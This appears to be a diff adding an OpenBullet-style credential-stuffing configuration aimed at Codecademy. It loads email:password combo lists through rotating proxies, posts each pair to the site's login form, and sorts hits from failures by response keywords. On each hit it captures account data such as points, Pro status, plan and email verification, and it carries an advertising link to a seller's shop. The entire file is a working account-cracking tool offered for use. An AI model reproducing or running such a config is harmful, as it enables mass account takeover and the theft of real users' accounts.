@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "CodecAdemy by-IpProxeis",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-21T22:45:52.51379+02:00",
+  "AdditionalInfo": "https://shoppy.gg/@IpMarket",
+  "Author": "Proxeis",
+  "Version": "1.3.4 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.codecademy.com/login" 
+  CONTENT "authenticity_token=9%2FGTmYGBAuACqUTInyPzqwnAm4o13d0PKQvrWW3KtZ4%3D&redirect=%2F&user%5Blogin%5D=<USER>&user%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "origin: https://www.codecademy.com" 
+  HEADER "referer: https://www.codecademy.com/login?redirect=%2F" 
+
+#CHECK KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "created_at\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "I forgot my password" 
+
+#https://shoppy.gg/@IpMarket PARSE "<SOURCE>" LR "\"total_points\":" ",\"roles\"" -> CAP "Point" 
+
+#https://shoppy.gg/@IpMarket PARSE "<SOURCE>" LR "\"pro\":" ",\"" -> CAP "Pro" 
+
+#https://shoppy.gg/@IpMarket PARSE "<SOURCE>" LR "\"user_type\":\"" "\"" -> CAP "Plan" 
+
+#HIT_IpProxeis PARSE "<SOURCE>" LR "verified_email\":\"" "\"," -> CAP "Email verified" "" " ^^By IpProxeis" 
+
